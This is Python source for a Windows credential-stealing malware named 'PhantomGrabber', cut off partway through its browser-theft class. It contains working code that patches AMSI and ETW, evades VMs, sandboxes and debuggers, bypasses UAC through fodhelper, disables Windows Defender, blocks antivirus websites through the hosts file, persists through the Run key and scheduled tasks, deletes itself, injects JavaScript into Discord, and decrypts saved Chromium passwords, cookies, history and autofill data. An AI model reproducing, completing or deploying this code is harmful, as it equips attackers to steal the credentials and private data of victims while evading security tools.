import logging
import ctypes
import ctypes.wintypes
import os
import sys
import platform
import shutil
import subprocess
import time
import uuid
import winreg
import base64
import random
import string
import json
import sqlite3
import tempfile
from Crypto.Cipher import AES
import re
import urllib3
import struct
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
import zipfile
import zlib
import threading

class Settings:
    C2 = (0, base64.b64decode('').decode())
    Mutex = base64.b64decode('UGhhbnRvbU11dGV4').decode()
    ArchivePassword = base64.b64decode('cGhhbnRvbQ==').decode()
    PingMe = ''
    Vmprotect = ''
    Startup = ''
    Melt = ''
    UacBypass = ''
    HideConsole = ''
    Debug = ''
    RunBoundOnStartup = ''
    CaptureWebcam = ''
    CapturePasswords = ''
    CaptureCookies = ''
    CaptureHistory = ''
    CaptureAutofills = ''
    CaptureDiscordTokens = ''
    CaptureGames = ''
    CaptureWifiPasswords = ''
    CaptureSystemInfo = ''
    CaptureScreenshot = ''
    CaptureTelegram = ''
    CaptureCommonFiles = ''
    CaptureWallets = ''
    CaptureExif = ''
    CaptureCreditCards = ''
    FakeError = ('', ('Error', 'An error occurred', '0'))
    BlockAvSites = ''
    DiscordInjection = ''
    Injection = ''
Logger = logging.getLogger('PhantomGrabber')
if Settings.Debug:
    logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(name)s: %(message)s')
else:
    logging.basicConfig(level=logging.CRITICAL)

class Syscalls:
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    user32 = ctypes.windll.user32
    advapi32 = ctypes.windll.advapi32

    @staticmethod
    def HideConsole() -> None:
        hwnd = Syscalls.kernel32.GetConsoleWindow()
        if hwnd:
            Syscalls.user32.ShowWindow(hwnd, 0)

    @staticmethod
    def ShowConsole() -> None:
        hwnd = Syscalls.kernel32.GetConsoleWindow()
        if hwnd:
            Syscalls.user32.ShowWindow(hwnd, 5)

    @staticmethod
    def CreateMutex(name: str) -> bool:
        Syscalls.kernel32.CreateMutexW(None, False, name)
        return ctypes.get_last_error() != 183

    @staticmethod
    def IsDebuggerPresent() -> bool:
        return bool(Syscalls.kernel32.IsDebuggerPresent())

    @staticmethod
    def NtQueryInformationProcess() -> bool:
        debug_port = ctypes.c_ulong(0)
        status = Syscalls.ntdll.NtQueryInformationProcess(ctypes.c_void_p(-1), 7, ctypes.byref(debug_port), ctypes.sizeof(debug_port), None)
        return status == 0 and debug_port.value != 0

    @staticmethod
    def PatchAmsi() -> bool:
        try:
            amsi = ctypes.windll.LoadLibrary('amsi.dll')
            addr = Syscalls.kernel32.GetProcAddress(ctypes.cast(amsi._handle, ctypes.c_void_p), b'AmsiScanBuffer')
            if not addr:
                return False
            patch = b'\xb8W\x00\x07\x80\xc3'
            old_protect = ctypes.c_ulong(0)
            Syscalls.kernel32.VirtualProtect(ctypes.c_void_p(addr), len(patch), 64, ctypes.byref(old_protect))
            ctypes.memmove(ctypes.c_void_p(addr), patch, len(patch))
            Syscalls.kernel32.VirtualProtect(ctypes.c_void_p(addr), len(patch), old_protect.value, ctypes.byref(old_protect))
            return True
        except Exception:
            return False

    @staticmethod
    def PatchEtw() -> bool:
        try:
            addr = Syscalls.kernel32.GetProcAddress(ctypes.cast(Syscalls.ntdll._handle, ctypes.c_void_p), b'EtwEventWrite')
            if not addr:
                return False
            patch = b'3\xc0\xc3'
            old_protect = ctypes.c_ulong(0)
            Syscalls.kernel32.VirtualProtect(ctypes.c_void_p(addr), len(patch), 64, ctypes.byref(old_protect))
            ctypes.memmove(ctypes.c_void_p(addr), patch, len(patch))
            Syscalls.kernel32.VirtualProtect(ctypes.c_void_p(addr), len(patch), old_protect.value, ctypes.byref(old_protect))
            return True
        except Exception:
            return False

class VmProtect:
    _logger = logging.getLogger('VmProtect')
    _VM_MAC_PREFIXES = ('00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '00:03:ff', '00:15:5d')
    _VM_PROCESSES = ('vmtoolsd.exe', 'vmwaretray.exe', 'VGAuthService.exe', 'VBoxService.exe', 'VBoxTray.exe', 'vmsrvc.exe', 'vmusrvc.exe', 'qemu-ga.exe', 'joeboxcontrol.exe', 'joeboxserver.exe', 'xenservice.exe', 'prl_tools.exe')
    _SANDBOX_USERNAMES = ('sandbox', 'virus', 'malware', 'test', 'john', 'user', 'admin', 'currentuser', 'wdagutilityaccount')

    @staticmethod
    def isVM() -> bool:
        checks = [VmProtect.checkMAC, VmProtect.checkProcesses, VmProtect.checkRegistry, VmProtect.checkDisk, VmProtect.checkMemory, VmProtect.checkCPU, VmProtect.checkResolution, VmProtect.checkUptime, VmProtect.checkMouseMovement, VmProtect.checkRecentFiles, VmProtect.checkUsername]
        for check in checks:
            try:
                if check():
                    VmProtect._logger.debug(f'VM detected by {check.__name__}')
                    return True
            except Exception as exc:
                VmProtect._logger.debug(f'{check.__name__} raised: {exc}')
        return False

    @staticmethod
    def checkMAC() -> bool:
        try:
            mac_hex = uuid.getnode()
            mac_str = ':'.join((f'{mac_hex >> i & 255:02x}' for i in range(40, -1, -8)))
            mac_lower = mac_str.lower()
            for prefix in VmProtect._VM_MAC_PREFIXES:
                if mac_lower.startswith(prefix):
                    return True
            result = subprocess.run(['getmac', '/FO', 'CSV', '/NH'], capture_output=True, text=True, timeout=10, creationflags=134217728)
            for line in result.stdout.strip().splitlines():
                parts = line.replace('"', '').split(',')
                if parts:
                    raw_mac = parts[0].strip().lower().replace('-', ':')
                    for prefix in VmProtect._VM_MAC_PREFIXES:
                        if raw_mac.startswith(prefix):
                            return True
            return False
        except Exception:
            return False

    @staticmethod
    def checkProcesses() -> bool:
        try:
            result = subprocess.run(['tasklist', '/FO', 'CSV', '/NH'], capture_output=True, text=True, timeout=15, creationflags=134217728)
            running = result.stdout.lower()
            for proc in VmProtect._VM_PROCESSES:
                if proc.lower() in running:
                    return True
            return False
        except Exception:
            return False

    @staticmethod
    def checkRegistry() -> bool:
        try:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\VMware, Inc.\\VMware Tools')
                return True
            except FileNotFoundError:
                pass
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Oracle\\VirtualBox Guest Additions')
                return True
            except FileNotFoundError:
                pass
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'HARDWARE\\Description\\System')
                bios_version, _ = winreg.QueryValueEx(key, 'SystemBiosVersion')
                winreg.CloseKey(key)
                bios_str = str(bios_version).lower()
                for sig in ('vbox', 'qemu', 'bochs', 'virtual'):
                    if sig in bios_str:
                        return True
            except (FileNotFoundError, OSError):
                pass
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'HARDWARE\\ACPI\\DSDT')
                for i in range(winreg.QueryInfoKey(key)[0]):
                    subkey_name = winreg.EnumKey(key, i)
                    if 'VBOX' in subkey_name.upper():
                        winreg.CloseKey(key)
                        return True
                winreg.CloseKey(key)
            except (FileNotFoundError, OSError):
                pass
            return False
        except Exception:
            return False

    @staticmethod
    def checkDisk() -> bool:
        try:
            total, _, _ = shutil.disk_usage(os.environ.get('SystemDrive', 'C:') + '\\')
            return total < 60 * 1024 ** 3
        except Exception:
            return False

    @staticmethod
    def checkMemory() -> bool:
        try:

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [('dwLength', ctypes.c_ulong), ('dwMemoryLoad', ctypes.c_ulong), ('ullTotalPhys', ctypes.c_ulonglong), ('ullAvailPhys', ctypes.c_ulonglong), ('ullTotalPageFile', ctypes.c_ulonglong), ('ullAvailPageFile', ctypes.c_ulonglong), ('ullTotalVirtual', ctypes.c_ulonglong), ('ullAvailVirtual', ctypes.c_ulonglong), ('ullAvailExtendedVirtual', ctypes.c_ulonglong)]
            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            return mem.ullTotalPhys < 2 * 1024 ** 3
        except Exception:
            return False

    @staticmethod
    def checkCPU() -> bool:
        try:
            return (os.cpu_count() or 1) < 2
        except Exception:
            return False

    @staticmethod
    def checkResolution() -> bool:
        try:
            user32 = ctypes.windll.user32
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)
            return (width, height) in ((800, 600), (1024, 768))
        except Exception:
            return False

    @staticmethod
    def checkUptime() -> bool:
        try:
            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
            uptime_minutes = uptime_ms / (1000 * 60)
            return uptime_minutes < 10
        except Exception:
            return False

    @staticmethod
    def checkMouseMovement() -> bool:
        try:

            class POINT(ctypes.Structure):
                _fields_ = [('x', ctypes.c_long), ('y', ctypes.c_long)]
            pt1 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))
            time.sleep(0.5)
            pt2 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
            return pt1.x == pt2.x and pt1.y == pt2.y
        except Exception:
            return False

    @staticmethod
    def checkRecentFiles() -> bool:
        try:
            recent_path = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Recent')
            if not os.path.isdir(recent_path):
                return True
            items = os.listdir(recent_path)
            return len(items) < 10
        except Exception:
            return False

    @staticmethod
    def checkUsername() -> bool:
        try:
            username = os.getlogin().lower().strip()
            return username in VmProtect._SANDBOX_USERNAMES
        except Exception:
            return False

class AntiDebug:
    _logger = logging.getLogger('AntiDebug')
    _DEBUGGER_PROCESSES = ('x64dbg.exe', 'x32dbg.exe', 'ollydbg.exe', 'ida64.exe', 'ida.exe', 'idaq64.exe', 'windbg.exe', 'processhacker.exe', 'procmon.exe', 'procmon64.exe', 'procexp.exe', 'procexp64.exe', 'httpdebugger.exe', 'fiddler.exe', 'wireshark.exe', 'dnspy.exe', 'cheatengine.exe')

    @staticmethod
    def isDebugged() -> bool:
        checks = [AntiDebug.checkIsDebuggerPresent, AntiDebug.checkRemoteDebugger, AntiDebug.checkDebugPort, AntiDebug.timingCheck, AntiDebug.checkDebuggerProcesses]
        for check in checks:
            try:
                if check():
                    AntiDebug._logger.debug(f'Debugger detected by {check.__name__}')
                    return True
            except Exception as exc:
                AntiDebug._logger.debug(f'{check.__name__} raised: {exc}')
        return False

    @staticmethod
    def checkIsDebuggerPresent() -> bool:
        try:
            return Syscalls.IsDebuggerPresent()
        except Exception:
            return False

    @staticmethod
    def checkRemoteDebugger() -> bool:
        try:
            is_debugged = ctypes.c_int(0)
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.c_void_p(-1), ctypes.byref(is_debugged))
            return bool(is_debugged.value)
        except Exception:
            return False

    @staticmethod
    def checkDebugPort() -> bool:
        try:
            return Syscalls.NtQueryInformationProcess()
        except Exception:
            return False

    @staticmethod
    def timingCheck() -> bool:
        try:
            start = time.perf_counter()
            total = 0
            for i in range(10000000):
                total += i
            elapsed = time.perf_counter() - start
            return elapsed > 2.0
        except Exception:
            return False

    @staticmethod
    def checkDebuggerProcesses() -> bool:
        try:
            result = subprocess.run(['tasklist', '/FO', 'CSV', '/NH'], capture_output=True, text=True, timeout=15, creationflags=134217728)
            running = result.stdout.lower()
            for proc in AntiDebug._DEBUGGER_PROCESSES:
                if proc.lower() in running:
                    return True
            return False
        except Exception:
            return False

class Utility:
    _logger = logging.getLogger('Utility')

    @staticmethod
    def IsAdmin() -> bool:
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False

    @staticmethod
    def GetSelf() -> tuple[str, bool]:
        is_frozen = hasattr(sys, '_MEIPASS')
        if is_frozen:
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
        return (exe_path, is_frozen)

    @staticmethod
    def IsConnectedToInternet() -> bool:
        try:
            import urllib.request
            urllib.request.urlopen('http://www.google.com', timeout=5)
            return True
        except Exception:
            return False

    @staticmethod
    def UACbypass() -> bool:
        try:
            exe_path, _ = Utility.GetSelf()
            cmd = f'''"{exe_path}" {' '.join(sys.argv[1:])} --nouacbypass'''
            reg_path = 'Software\\Classes\\ms-settings\\Shell\\Open\\command'
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
            winreg.CloseKey(key)
            subprocess.Popen('fodhelper.exe', creationflags=134217728, shell=True)
            time.sleep(3)
            try:
                winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\ms-settings\\Shell\\Open\\command', winreg.KEY_ALL_ACCESS, 0)
            except Exception:
                try:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\ms-settings\\Shell\\Open\\command')
                except Exception:
                    pass
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\ms-settings\\Shell\\Open')
            except Exception:
                pass
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\ms-settings\\Shell')
            except Exception:
                pass
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, 'Software\\Classes\\ms-settings')
            except Exception:
                pass
            return True
        except Exception as exc:
            Utility._logger.error(f'UAC bypass failed: {exc}')
            return False

    @staticmethod
    def UACPrompt(exe_path: str) -> bool:
        try:
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', exe_path, ' '.join(sys.argv[1:]), None, 1)
            return result > 32
        except Exception as exc:
            Utility._logger.error(f'UAC prompt failed: {exc}')
            return False

    @staticmethod
    def ExcludeFromDefender(path: str=None) -> None:
        try:
            if path is None:
                path = sys.executable
            subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', f'Add-MpPreference -ExclusionPath "{path}" -Force'], capture_output=True, creationflags=134217728)
        except Exception as exc:
            Utility._logger.error(f'Defender exclusion failed: {exc}')

    @staticmethod
    def DisableDefender() -> None:
        commands = ['Set-MpPreference -DisableRealtimeMonitoring $true', 'Set-MpPreference -DisableIOAVProtection $true', 'Set-MpPreference -DisableBehaviorMonitoring $true', 'Set-MpPreference -DisableBlockAtFirstSeen $true', 'Set-MpPreference -MAPSReporting 0', 'Set-MpPreference -SubmitSamplesConsent 2']
        for cmd in commands:
            try:
                subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', cmd], capture_output=True, creationflags=134217728)
            except Exception as exc:
                Utility._logger.error(f'DisableDefender cmd failed: {exc}')

    @staticmethod
    def BlockAvSites() -> None:
        domains = ['virustotal.com', 'avast.com', 'avg.com', 'avira.com', 'bitdefender.com', 'kaspersky.com', 'malwarebytes.com', 'mcafee.com', 'norton.com', 'sophos.com', 'trendmicro.com', 'eset.com', 'comodo.com', 'drweb.com', 'f-secure.com', 'pandasecurity.com', 'clamav.net', 'zonealarm.com']
        hosts_path = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
        try:
            existing = ''
            try:
                with open(hosts_path, 'r', encoding='utf-8') as f:
                    existing = f.read()
            except Exception:
                pass
            lines_to_add = []
            for domain in domains:
                entry_bare = f'0.0.0.0 {domain}'
                entry_www = f'0.0.0.0 www.{domain}'
                if entry_bare not in existing:
                    lines_to_add.append(entry_bare)
                if entry_www not in existing:
                    lines_to_add.append(entry_www)
            if lines_to_add:
                with open(hosts_path, 'a', encoding='utf-8') as f:
                    f.write('\n' + '\n'.join(lines_to_add) + '\n')
        except Exception as exc:
            Utility._logger.error(f'BlockAvSites failed: {exc}')

    @staticmethod
    def _random_name(length: int=12) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @staticmethod
    def PutInStartup() -> str | None:
        try:
            exe_path, _ = Utility.GetSelf()
            rand_name = Utility._random_name() + '.exe'
            startup_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            os.makedirs(startup_dir, exist_ok=True)
            startup_path = os.path.join(startup_dir, rand_name)
            shutil.copy2(exe_path, startup_path)
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, rand_name.replace('.exe', ''), 0, winreg.REG_SZ, startup_path)
                winreg.CloseKey(key)
            except Exception as exc:
                Utility._logger.error(f'Registry run key failed: {exc}')
            return startup_path
        except Exception as exc:
            Utility._logger.error(f'PutInStartup failed: {exc}')
            return None

    @staticmethod
    def CreateScheduledTask() -> bool:
        try:
            exe_path, _ = Utility.GetSelf()
            task_name = 'Phantom_' + Utility._random_name(8)
            result = subprocess.run(['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"', '/sc', 'onlogon', '/rl', 'highest', '/f'], capture_output=True, creationflags=134217728)
            return result.returncode == 0
        except Exception as exc:
            Utility._logger.error(f'CreateScheduledTask failed: {exc}')
            return False

    @staticmethod
    def IsInStartup(path: str=None) -> bool:
        try:
            if path is None:
                path, _ = Utility.GetSelf()
            basename = os.path.basename(path)
            startup_dir = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            if os.path.isdir(startup_dir):
                for item in os.listdir(startup_dir):
                    if item.lower() == basename.lower():
                        return True
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        if path.lower() in value.lower():
                            winreg.CloseKey(key)
                            return True
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except Exception:
                pass
            return False
        except Exception:
            return False

    @staticmethod
    def HideSelf() -> None:
        try:
            exe_path, _ = Utility.GetSelf()
            subprocess.run(['attrib', '+h', '+s', exe_path], capture_output=True, creationflags=134217728)
        except Exception as exc:
            Utility._logger.error(f'HideSelf failed: {exc}')

    @staticmethod
    def DeleteSelf() -> None:
        try:
            exe_path, _ = Utility.GetSelf()
            bat_name = Utility._random_name() + '.bat'
            bat_path = os.path.join(os.environ.get('TEMP', '.'), bat_name)
            bat_content = f'@echo off\nping 127.0.0.1 -n 3 > nul\ndel /f /q "{exe_path}"\ndel /f /q "%~f0"\n'
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(bat_content)
            subprocess.Popen(bat_path, creationflags=134217728, shell=True)
            sys.exit(0)
        except Exception as exc:
            Utility._logger.error(f'DeleteSelf failed: {exc}')

    @staticmethod
    def InjectDiscord(injection_b64: str) -> None:
        try:
            injection_js = base64.b64decode(injection_b64).decode('utf-8')
        except Exception as exc:
            Utility._logger.error(f'Failed to decode injection payload: {exc}')
            return
        appdata = os.environ.get('APPDATA', '')
        discord_variants = ['discord', 'discordcanary', 'discordptb']
        for variant in discord_variants:
            variant_path = os.path.join(appdata, variant)
            if not os.path.isdir(variant_path):
                continue
            try:
                version_dirs = []
                for item in os.listdir(variant_path):
                    full = os.path.join(variant_path, item)
                    if os.path.isdir(full) and item.startswith('0.'):
                        version_dirs.append(full)
                if not version_dirs:
                    continue
                version_dirs.sort(key=os.path.getmtime, reverse=True)
                latest_version = version_dirs[0]
                modules_path = os.path.join(latest_version, 'modules')
                if not os.path.isdir(modules_path):
                    continue
                core_dir = None
                for mod in os.listdir(modules_path):
                    if mod.startswith('discord_desktop_core'):
                        candidate = os.path.join(modules_path, mod, 'discord_desktop_core')
                        if os.path.isdir(candidate):
                            core_dir = candidate
                            break
                if core_dir is None:
                    continue
                index_js_path = os.path.join(core_dir, 'index.js')
                with open(index_js_path, 'w', encoding='utf-8') as f:
                    f.write(injection_js)
                Utility._logger.debug(f'Injected into {variant} at {index_js_path}')
            except Exception as exc:
                Utility._logger.error(f'Discord injection failed for {variant}: {exc}')

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_ubyte))]

class Browsers:
    _logger = logging.getLogger('Browsers')
    BROWSER_PATHS = {'Chrome': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'), 'Chrome SxS': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome SxS', 'User Data'), 'Edge': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'), 'Brave': os.path.join(os.getenv('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Opera': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('APPDATA', ''), 'Opera Software', 'Opera GX Stable'), 'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'User Data'), 'Iridium': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Iridium', 'User Data'), 'Chromium': os.path.join(os.getenv('LOCALAPPDATA', ''), 'Chromium', 'User Data')}

    @staticmethod
    def CryptUnprotectData(encrypted: bytes) -> bytes:
        blob_in = DATA_BLOB()
        blob_in.cbData = len(encrypted)
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted, len(encrypted)), ctypes.POINTER(ctypes.c_ubyte))
        blob_out = DATA_BLOB()
        result = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
        if not result:
            raise ctypes.WinError(ctypes.get_last_error())
        decrypted = bytes((ctypes.c_ubyte * blob_out.cbData).from_address(ctypes.addressof(blob_out.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted

    @staticmethod
    def GetEncryptionKey(browser_path: str) -> bytes | None:
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.isfile(local_state_path):
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
        except Exception as exc:
            Browsers._logger.error(f'Failed to read Local State: {exc}')
            return None
        os_crypt = local_state.get('os_crypt', {})
        app_bound_key_b64 = os_crypt.get('app_bound_encrypted_key')
        if app_bound_key_b64:
            try:
                app_bound_raw = base64.b64decode(app_bound_key_b64)
                if app_bound_raw[:5] == b'DPAPI':
                    app_bound_raw = app_bound_raw[5:]
                intermediate = Browsers.CryptUnprotectData(app_bound_raw)
                if len(intermediate) > 64:
                    try:
                        key = Browsers.CryptUnprotectData(intermediate[4:])
                        if len(key) == 32:
                            Browsers._logger.debug('Using app_bound key (double DPAPI)')
                            return key
                    except Exception:
                        pass
                if len(intermediate) == 32:
                    Browsers._logger.debug('Using app_bound key (single DPAPI)')
                    return intermediate
                if len(intermediate) > 32:
                    Browsers._logger.debug('Using app_bound key (trimmed)')
                    return intermediate[-32:]
            except Exception as exc:
                Browsers._logger.debug(f'App-bound key extraction failed: {exc}')
        encrypted_key_b64 = os_crypt.get('encrypted_key')
        if not encrypted_key_b64:
            Browsers._logger.error('No encryption key found in Local State')
            return None
        try:
            encrypted_key = base64.b64decode(encrypted_key_b64)
            encrypted_key = encrypted_key[5:]
            key = Browsers.CryptUnprotectData(encrypted_key)
            Browsers._logger.debug('Using standard DPAPI key')
            return key
        except Exception as exc:
            Browsers._logger.error(f'Key decryption failed: {exc}')
            return None

    @staticmethod
    def DecryptValue(encrypted_value: bytes, key: bytes) -> str:
        if not encrypted_value:
            return ''
        try:
            if encrypted_value[:3] in (b'v10', b'v11', b'v20'):
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8', errors='replace')
            decrypted = Browsers.CryptUnprotectData(encrypted_value)
            return decrypted.decode('utf-8', errors='replace')
        except Exception as exc:
            Browsers._logger.debug(f'Decryption failed: {exc}')
            return ''

    @staticmethod
    def _copy_db_to_temp(db_path: str) -> str | None:
        if not os.path.isfile(db_path):
            return None
        try:
            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.db')
            os.close(tmp_fd)
            shutil.copy2(db_path, tmp_path)
            return tmp_path
        except Exception as exc:
            Browsers._logger.debug(f'Failed to copy db {db_path}: {exc}')
            return None

    @staticmethod
    def GetPasswords(browser_path: str, key: bytes, output_dir: str) -> int:
        count = 0
        db_path = os.path.join(browser_path, 'Login Data')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0
        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            except sqlite3.OperationalError:
                conn.close()
                return 0
            results = []
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                if not url or not username:
                    continue
                password = Browsers.DecryptValue(encrypted_password, key)
                if not password:
                    continue
                results.append(f'URL: {url}\nUsername: {username}\nPassword: {password}\n')
                count += 1
            conn.close()
            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'passwords.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')
        except Exception as exc:
            Browsers._logger.error(f'GetPasswords error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        return count

    @staticmethod
    def GetCookies(browser_path: str, key: bytes, output_dir: str) -> int:
        count = 0
        possible_paths = [os.path.join(browser_path, 'Network', 'Cookies'), os.path.join(browser_path, 'Cookies')]
        db_path = None
        for p in possible_paths:
            if os.path.isfile(p):
                db_path = p
                break
        if db_path is None:
            return 0
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0
        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies')
            except sqlite3.OperationalError:
                conn.close()
                return 0
            results = []
            results.append('# Netscape HTTP Cookie File')
            results.append('# https://curl.se/docs/http-cookies.html')
            results.append('')
            for row in cursor.fetchall():
                host_key = row[0]
                name = row[1]
                path = row[2]
                encrypted_value = row[3]
                expires_utc = row[4]
                is_secure = row[5]
                is_httponly = row[6]
                value = Browsers.DecryptValue(encrypted_value, key)
                if expires_utc and expires_utc > 0:
                    unix_expires = expires_utc / 1000000 - 11644473600
                    unix_expires = max(0, int(unix_expires))
                else:
                    unix_expires = 0
                include_subdomains = 'TRUE' if host_key.startswith('.') else 'FALSE'
                secure_str = 'TRUE' if is_secure else 'FALSE'
                httponly_prefix = '#HttpOnly_' if is_httponly else ''
                line = f'{httponly_prefix}{host_key}\t{include_subdomains}\t{path}\t{secure_str}\t{unix_expires}\t{name}\t{value}'
                results.append(line)
                count += 1
            conn.close()
            if count > 0:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'cookies.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')
        except Exception as exc:
            Browsers._logger.error(f'GetCookies error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        return count

    @staticmethod
    def GetHistory(browser_path: str, output_dir: str) -> int:
        count = 0
        db_path = os.path.join(browser_path, 'History')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0
        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC')
            except sqlite3.OperationalError:
                conn.close()
                return 0
            results = []
            for row in cursor.fetchall():
                url = row[0]
                title = row[1] or '(No Title)'
                visit_count = row[2]
                last_visit_time = row[3]
                if last_visit_time and last_visit_time > 0:
                    import datetime
                    epoch = datetime.datetime(1601, 1, 1)
                    try:
                        visit_dt = epoch + datetime.timedelta(microseconds=last_visit_time)
                        visit_str = visit_dt.strftime('%Y-%m-%d %H:%M:%S')
                    except (OverflowError, ValueError):
                        visit_str = str(last_visit_time)
                else:
                    visit_str = 'Unknown'
                results.append(f'URL: {url}\nTitle: {title}\nVisits: {visit_count}\nLast Visit: {visit_str}\n')
                count += 1
            conn.close()
            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'history.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')
        except Exception as exc:
            Browsers._logger.error(f'GetHistory error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        return count

    @staticmethod
    def GetAutofills(browser_path: str, output_dir: str) -> int:
        count = 0
        db_path = os.path.join(browser_path, 'Web Data')
        tmp_path = Browsers._copy_db_to_temp(db_path)
        if tmp_path is None:
            return 0
        try:
            conn = sqlite3.connect(tmp_path)
            conn.text_factory = lambda b: b.decode('utf-8', errors='replace')
            cursor = conn.cursor()
            try:
                cursor.execute('SELECT name, value FROM autofill')
            except sqlite3.OperationalError:
                conn.close()
                return 0
            results = []
            for row in cursor.fetchall():
                name = row[0]
                value = row[1]
                if name and value:
                    results.append(f'{name}: {value}')
                    count += 1
            conn.close()
            if results:
                os.makedirs(output_dir, exist_ok=True)
                with open(os.path.join(output_dir, 'autofill.txt'), 'a', encoding='utf-8') as f:
                    f.write('\n'.join(results) + '\n')
        except Exception as exc:
            Browsers._logger.error(f'GetAutofills error: {exc}')
        finally:
            try:
                os.remove(tmp_path)
            except Exception:
                pass
        return count

    @staticmethod
